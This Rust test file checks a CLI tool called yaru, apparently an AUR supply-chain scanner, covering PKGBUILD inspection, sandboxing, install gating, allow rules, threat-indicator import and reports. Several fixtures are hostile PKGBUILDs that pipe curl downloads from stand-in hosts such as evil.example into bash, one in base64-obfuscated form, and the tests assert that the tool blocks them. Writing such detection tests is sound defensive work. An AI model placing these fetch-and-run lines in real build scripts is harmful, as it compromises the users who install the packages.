use assert_cmd::Command;
use predicates::prelude::*;
use std::fs;
use tempfile::tempdir;

#[test]
fn test_cli_status() {
    let tmp = tempdir().unwrap();
    let mut cmd = Command::cargo_bin("yaru").unwrap();
    cmd.env("YARU_DB_PATH", tmp.path().join("yaru.db"))
        .arg("status");
    cmd.assert()
        .success()
        .stdout(predicate::str::contains(
            "YARU · AUR Supply-Chain Security Layer",
        ))
        .stdout(predicate::str::contains("Policy"));
}

#[test]
fn test_cli_inspect_local_clean_pkgbuild() {
    let tmp = tempdir().unwrap();
    let pkgbuild = tmp.path().join("PKGBUILD");
    fs::write(
        &pkgbuild,
        r#"
pkgname=clean-test
pkgver=1.0.0
pkgrel=1
arch=('x86_64')
source=("https://example.com/source-1.0.0.tar.gz")
sha256sums=('b2sum1234567890abcdef')

build() {
    echo "compiling cleanly"
}
"#,
    )
    .unwrap();

    let mut cmd = Command::cargo_bin("yaru").unwrap();
    cmd.arg("inspect-local").arg(tmp.path().to_str().unwrap());
    cmd.assert()
        .success()
        .stdout(predicate::str::contains("EVALUATION RESULT"))
        .stdout(predicate::str::contains("[OK] ALLOW"));
}

#[test]
fn test_cli_inspect_local_malicious_curl_bash() {
    let tmp = tempdir().unwrap();
    let pkgbuild = tmp.path().join("PKGBUILD");
    fs::write(
        &pkgbuild,
        r#"
pkgname=malicious-test
pkgver=1.0.0
pkgrel=1
arch=('x86_64')
source=("https://example.com/source.tar.gz")

build() {
    curl -sSL https://evil.example/payload.sh | bash
}
"#,
    )
    .unwrap();

    let mut cmd = Command::cargo_bin("yaru").unwrap();
    cmd.arg("inspect-local").arg(tmp.path().to_str().unwrap());
    cmd.assert()
        .success()
        .stdout(predicate::str::contains("EVALUATION RESULT"))
        .stdout(predicate::str::contains("Remote Shell Download"))
        .stdout(predicate::str::contains("[X] BLOCK"));
}

#[test]
fn test_cli_inspect_local_obfuscated_base64_payload() {
    let tmp = tempdir().unwrap();
    let pkgbuild = tmp.path().join("PKGBUILD");
    // "curl evil.com | sh" base64-encoded is "Y3VybCBldmlsLmNvbSB8IHNo"
    fs::write(
        &pkgbuild,
        r#"
pkgname=obfuscated-test
pkgver=1.0.0
pkgrel=1
arch=('x86_64')

build() {
    echo "Y3VybCBldmlsLmNvbSB8IHNo" | base64 -d | sh
}
"#,
    )
    .unwrap();

    let mut cmd = Command::cargo_bin("yaru").unwrap();
    cmd.arg("inspect-local").arg(tmp.path().to_str().unwrap());
    cmd.assert()
        .success()
        .stdout(predicate::str::contains("EVALUATION RESULT"))
        .stdout(predicate::str::contains("Obfuscated"))
        .stdout(predicate::str::contains("[X] BLOCK"));
}

#[test]
fn test_cli_allow_rule_persists_in_config() {
    let tmp = tempdir().unwrap();
    let mut cmd = Command::cargo_bin("yaru").unwrap();
    cmd.env("YARU_CONFIG_DIR", tmp.path().to_str().unwrap())
        .env("HOME", tmp.path().to_str().unwrap())
        .arg("allow-rule")
        .arg("remote-shell-download");
    cmd.assert().success();

    let content = fs::read_to_string(tmp.path().join("config.toml")).unwrap_or_default();
    assert!(content.contains("remote-shell-download"));
}

#[test]
fn test_cli_allow_rule_remove_removes_from_config() {
    let tmp = tempdir().unwrap();
    let mut add_cmd = Command::cargo_bin("yaru").unwrap();
    add_cmd
        .env("YARU_CONFIG_DIR", tmp.path().to_str().unwrap())
        .env("HOME", tmp.path().to_str().unwrap())
        .arg("allow-rule")
        .arg("remote-shell-download");
    add_cmd.assert().success();

    let mut rm_cmd = Command::cargo_bin("yaru").unwrap();
    rm_cmd
        .env("YARU_CONFIG_DIR", tmp.path().to_str().unwrap())
        .env("HOME", tmp.path().to_str().unwrap())
        .arg("allow-rule")
        .arg("remove")
        .arg("remote-shell-download");
    rm_cmd.assert().success();

    let content = fs::read_to_string(tmp.path().join("config.toml")).unwrap_or_default();
    assert!(!content.contains("remote-shell-download"));

    // Also test --remove flag
    let mut add_again = Command::cargo_bin("yaru").unwrap();
    add_again
        .env("YARU_CONFIG_DIR", tmp.path().to_str().unwrap())
        .env("HOME", tmp.path().to_str().unwrap())
        .arg("allow-rule")
        .arg("remote-shell-download");
    add_again.assert().success();

    let mut rm_flag = Command::cargo_bin("yaru").unwrap();
    rm_flag
        .env("YARU_CONFIG_DIR", tmp.path().to_str().unwrap())
        .env("HOME", tmp.path().to_str().unwrap())
        .arg("allow-rule")
        .arg("--remove")
        .arg("remote-shell-download");
    rm_flag.assert().success();

    let content_after = fs::read_to_string(tmp.path().join("config.toml")).unwrap_or_default();
    assert!(!content_after.contains("remote-shell-download"));
}

#[test]
fn test_cli_sandbox_runs_clean_command() {
    let tmp = tempdir().unwrap();
    let mut cmd = Command::cargo_bin("yaru").unwrap();
    cmd.arg("sandbox")
        .arg(tmp.path().to_str().unwrap())
        .arg("/usr/bin/true");
    cmd.assert()
        .success()
        .stdout(predicate::str::contains("sandboxed command exited cleanly"));
}

#[test]
fn test_cli_sandbox_network_is_blocked_by_default() {
    let tmp = tempdir().unwrap();
    let mut cmd = Command::cargo_bin("yaru").unwrap();
    cmd.arg("sandbox")
        .arg(tmp.path().to_str().unwrap())
        .arg("/usr/bin/bash")
        .arg("-c")
        .arg("getent hosts aur.archlinux.org");
    cmd.assert()
        .failure()
        .stdout(predicate::str::contains("sandboxed command FAILED"));
}

#[test]
fn test_cli_build_refuses_quarantine_pkgbuild() {
    let tmp = tempdir().unwrap();
    fs::write(
        tmp.path().join("PKGBUILD"),
        r#"
pkgname=build-gate-test
pkgver=1
pkgrel=1
build() { curl https://evil.example/x.sh | bash; }
"#,
    )
    .unwrap();

    let mut cmd = Command::cargo_bin("yaru").unwrap();
    cmd.arg("build").arg(tmp.path().to_str().unwrap());
    cmd.assert()
        .failure()
        .stderr(predicate::str::contains("yaru build refused"));
}

#[test]
fn test_cli_build_dry_run_clean_pkgbuild() {
    let tmp = tempdir().unwrap();
    fs::write(
        tmp.path().join("PKGBUILD"),
        r#"
pkgname=build-clean-test
pkgver=1
pkgrel=1
source=("https://example.com/x-1.0.0.tar.gz")
sha256sums=('b2sum1234567890abcdef')
build() { true; }
"#,
    )
    .unwrap();

    let mut cmd = Command::cargo_bin("yaru").unwrap();
    cmd.arg("build")
        .arg("--dry-run")
        .arg(tmp.path().to_str().unwrap());
    cmd.assert()
        .success()
        .stdout(predicate::str::contains("would build in sandbox"));
}

#[test]
fn test_cli_gateway_dry_run_non_install_forwards() {
    let mut cmd = Command::cargo_bin("yaru").unwrap();
    cmd.arg("gateway")
        .arg("--dry-run")
        .arg("-Qs")
        .arg("ripgrep");
    cmd.assert()
        .success()
        .stdout(predicate::str::contains("non-install operation"));
}

#[test]
fn test_cli_gateway_dry_run_official_fast_path() {
    let mut cmd = Command::cargo_bin("yaru").unwrap();
    cmd.arg("gateway").arg("--dry-run").arg("-S").arg("linux");
    cmd.assert()
        .success()
        .stdout(predicate::str::contains("fast path (official zone): linux"))
        .stdout(predicate::str::contains("would forward"));
}

#[test]
fn test_cli_gateway_dry_run_unknown_package_refused() {
    let mut cmd = Command::cargo_bin("yaru").unwrap();
    cmd.arg("gateway")
        .arg("--dry-run")
        .arg("-S")
        .arg("totally-not-real-ghost-pkg-xyz-987");
    cmd.assert()
        .failure()
        .stdout(predicate::str::contains("BLOCKED: Source zone: UNKNOWN"));
}

#[test]
fn test_cli_ioc_import_json() {
    let tmp = tempdir().unwrap();
    let ioc_file = tmp.path().join("indicators.json");
    fs::write(
        &ioc_file,
        r#"[{"indicator":"malware.example","kind":"domain","severity":"Critical","confidence":0.99,"source":"test","first_seen":1,"last_seen":1,"status":"active"}]"#,
    )
    .unwrap();

    let mut cmd = Command::cargo_bin("yaru").unwrap();
    cmd.env("YARU_DB_PATH", tmp.path().join("yaru.db"))
        .arg("ioc")
        .arg("import")
        .arg(ioc_file);
    cmd.assert()
        .success()
        .stdout(predicate::str::contains("imported 1 threat indicators"));
}

#[test]
fn test_cli_gateway_dry_run_upgrade_flags() {
    let tmp = tempdir().unwrap();
    let cfg = "whitelisted_rules = []\n\n[policy]\non_warn = \"Continue\"\n";
    fs::write(tmp.path().join("config.toml"), cfg).unwrap();

    let mut cmd = Command::cargo_bin("yaru").unwrap();
    cmd.env("YARU_CONFIG_DIR", tmp.path().to_str().unwrap())
        .arg("gateway")
        .arg("--dry-run")
        .arg("-Syyu");
    cmd.assert().stdout(predicate::str::contains(
        "Checking for outdated AUR packages before upgrade",
    ));
}

#[test]
fn test_cli_gateway_dry_run_allow_package_override() {
    let mut cmd = Command::cargo_bin("yaru").unwrap();
    cmd.arg("gateway")
        .arg("--dry-run")
        .arg("--allow")
        .arg("totally-not-real-ghost-pkg-xyz-987")
        .arg("-S")
        .arg("totally-not-real-ghost-pkg-xyz-987");
    cmd.assert()
        .success()
        .stdout(predicate::str::contains(
            "single-run override explicitly allowed",
        ))
        .stdout(predicate::str::contains(
            "would forward to /usr/bin/paru: -S totally-not-real-ghost-pkg-xyz-987",
        ));
}

#[test]
fn test_cli_gateway_dry_run_auto_skip_blocked_package() {
    let mut cmd = Command::cargo_bin("yaru").unwrap();
    cmd.arg("gateway")
        .arg("--dry-run")
        .arg("--auto-skip")
        .arg("-S")
        .arg("totally-not-real-ghost-pkg-xyz-987");
    cmd.assert()
        .success()
        .stdout(predicate::str::contains(
            "Skipping blocked package(s): totally-not-real-ghost-pkg-xyz-987",
        ))
        .stdout(predicate::str::contains(
            "--ignore totally-not-real-ghost-pkg-xyz-987",
        ));
}

#[test]
fn test_cli_gateway_uses_cache_on_second_run() {
    let tmp = tempdir().unwrap();
    let db_path = tmp.path().join("yaru.db");

    // Non-AUR package (official zone) bypasses AUR pipeline entirely.
    // Both runs must succeed without AUR network access.
    let mut cmd1 = Command::cargo_bin("yaru").unwrap();
    cmd1.env("YARU_DB_PATH", &db_path)
        .arg("gateway")
        .arg("--dry-run")
        .arg("--auto-skip")
        .arg("-S")
        .arg("linux");
    cmd1.assert().success();

    let mut cmd2 = Command::cargo_bin("yaru").unwrap();
    cmd2.env("YARU_DB_PATH", &db_path)
        .arg("gateway")
        .arg("--dry-run")
        .arg("--auto-skip")
        .arg("-S")
        .arg("linux");
    cmd2.assert().success();
}

#[test]
fn test_cli_report_today_json() {
    let tmp = tempdir().unwrap();
    let mut cmd = Command::cargo_bin("yaru").unwrap();
    cmd.env("YARU_DB_PATH", tmp.path().join("yaru.db"))
        .arg("report")
        .arg("--today")
        .arg("--json");
    cmd.assert()
        .success()
        .stdout(predicate::str::contains("scanned"))
        .stdout(predicate::str::contains("blocked"))
        .stdout(predicate::str::contains("cache_hits"));
}

#[test]
fn test_cli_report_today_human() {
    let tmp = tempdir().unwrap();
    let mut cmd = Command::cargo_bin("yaru").unwrap();
    cmd.env("YARU_DB_PATH", tmp.path().join("yaru.db"))
        .arg("report")
        .arg("--today");
    cmd.assert()
        .success()
        .stdout(predicate::str::contains("Security report (today)"))
        .stdout(predicate::str::contains("Scanned"))
        .stdout(predicate::str::contains("Blocked"))
        .stdout(predicate::str::contains("Cache hits"));
}
